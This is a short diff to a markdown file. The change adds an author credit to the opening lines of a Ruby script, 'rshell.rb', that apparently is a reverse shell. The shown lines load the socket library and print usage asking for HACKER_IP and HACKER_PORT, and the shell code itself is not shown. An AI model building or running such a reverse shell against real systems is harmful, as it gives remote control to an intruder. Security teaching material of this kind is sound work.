@@ -21,6 +21,7 @@ cd rshell
 **rshell.rb**
 ```ruby
 #!/usr/bin/env ruby
+# KING SABRI | @KINGSABRI
 require 'socket'
 if ARGV.size < 2
   puts "ruby #{__FILE__}.rb [HACKER_IP  HACKER_PORT]\n\n"
